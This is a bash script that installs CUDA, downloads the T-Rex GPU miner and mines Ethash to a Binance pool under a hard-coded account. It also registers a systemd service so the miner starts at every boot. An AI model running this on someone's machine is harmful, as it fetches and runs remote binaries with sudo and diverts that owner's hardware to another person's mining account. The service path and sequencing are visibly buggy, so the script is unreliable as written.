SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
	echo "taind vip pro" > isHaveSetupCoin.txt
	cd /usr/local/bin
	sudo apt-get install linux-headers-$(uname -r) -y
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
	wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
	sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
	wget https://developer.download.nvidia.com/compute/cuda/11.6.2/local_installers/cuda-repo-ubuntu2004-11-6-local_11.6.2-510.47.03-1_amd64.deb
	sudo dpkg -i cuda-repo-ubuntu2004-11-6-local_11.6.2-510.47.03-1_amd64.deb
	sudo apt-key add /var/cuda-repo-ubuntu2004-11-6-local/7fa2af80.pub
	sudo apt-get update
	sudo apt-get -y install cuda
	echo "ta la vip pro" > isHaveSetupCoin.txt
	wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
	tar -xzvf t-rex-0.25.15-linux.tar.gz
	cd 0.25.15
	./t-rex -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u khoa2408 -p x -w Trex
	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/T-Rex -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u khoa2408 -p x -w Trex &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
	sudo systemctl daemon-reload
	sudo systemctl enable eth.service
	sudo systemctl start eth.service
else
	sudo systemctl start eth.service
fi
